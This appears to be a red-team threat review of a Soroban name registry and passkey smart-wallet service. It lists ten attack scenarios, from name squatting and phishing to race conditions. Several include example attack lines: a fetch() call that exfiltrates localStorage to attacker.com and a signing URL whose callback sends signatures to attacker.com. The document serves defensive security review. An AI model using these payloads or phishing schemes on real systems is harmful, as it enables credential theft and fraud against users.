# Red Team / Adversarial Attack Reviewers (91-100)

## Reviewer 91 — Name Squatting Attacker
**Attack**: Register all 26 single-letter names, all 676 two-letter names, and the top 1000 common English words. Total: ~1700 names for zero cost. Then demand payment from legitimate users who want these names. **No mitigation exists in the current contract.** Estimated effort: 1 script, 1 hour.

## Reviewer 92 — TTL Griefing Attacker
**Attack**: Monitor all `register` events (oh wait, there are no events — so monitor `resolve` RPC calls). Identify valuable names. Call `extend_ttl("alice")` every 24 hours to prevent expiration. Cost: negligible gas. Outcome: victim can never reclaim a squatted name through TTL expiration. **Fully exploitable.**

## Reviewer 93 — Phishing Attacker
**Attack**: Register names similar to legitimate projects: "stelllar" (3 l's), "sorobaan", "mysorobam". Create a smart account with a cloned UI at `stelllar.mysoroban.xyz`. Users visiting the misspelled URL see a fake wallet that steals their credentials. **Current system has no homoglyph detection or typosquatting protection.**

## Reviewer 94 — Signing Redirect Hijacker
**Attack**: Craft a URL: `alice.mysoroban.xyz/account/?sign=<hash>&callback=https://attacker.com/collect`. User visits, sees "Signature Request", approves with passkey, and the signature components are sent to attacker.com. **The callback URL is not validated against the current origin.** Partial mitigation: the hash is transaction-specific, so the signature is only useful for that exact transaction.

## Reviewer 95 — localStorage Harvester
**Attack**: Find any XSS on `*.mysoroban.xyz` (one input not sanitized, one library with CVE). Execute: `fetch("https://attacker.com/exfil?" + btoa(JSON.stringify(localStorage)))`. Harvests: account list, credential IDs, public keys, name-keypair secret, pending transaction XDR. **The keypair secret enables transaction submission.**

## Reviewer 96 — DNS Hijacking Attacker
**Attack**: Compromise wildcard DNS for `*.mysoroban.xyz` (via Cloudflare account compromise, registrar attack, or BGP hijack). Now `alice.mysoroban.xyz` points to attacker's server. Attacker serves a cloned wallet UI, captures passkey registrations. Since RP ID matches the domain, passkeys created on the attacker's server are valid. **This is a general web security risk, not specific to g2c, but the subdomain-per-account design amplifies the attack surface.**

## Reviewer 97 — Transaction Replay Attacker
**Attack**: Observe a name registration transaction on-chain. Extract the transaction XDR. The passkey signature is bound to a specific auth entry nonce, so direct replay fails. **This attack is mitigated by Soroban's nonce tracking.** However, the signature components in the redirect URL (query params) are logged and could be used for analysis even if not replayable.

## Reviewer 98 — Storage Exhaustion Attacker
**Attack**: Create thousands of smart accounts via factory (each costs ~10 XLM from Friendbot on testnet). Register a name for each. Goal: exhaust the name registry's storage footprint, making future registrations fail or become expensive. **On testnet this is trivial. On mainnet, cost is 10 XLM × N accounts + gas.** For 10,000 names: ~100,000 XLM ($10K at $0.10/XLM). Expensive but possible for a motivated attacker.

## Reviewer 99 — Race Condition Attacker
**Attack**: Two users try to register "alice" simultaneously. User A's simulation succeeds (name available). User B's simulation also succeeds. Both redirect to signing mode. Both sign. Both submit. Only one succeeds on-chain (Soroban atomic execution). The other gets a confusing error. **The UX doesn't handle this gracefully.** The losing user sees "Re-simulation failed" or a generic error, not "name was claimed by someone else".

## Reviewer 100 — Social Engineering Attacker
**Attack**: Register "support" or "help" as a name. Create a fake support page at `support.mysoroban.xyz`. Post on forums: "If you need help, visit support.mysoroban.xyz". Users visit, see a professional-looking page, and are asked to "verify their account" by signing a malicious transaction. **No reserved names prevent this. No way to flag or remove deceptive names.**
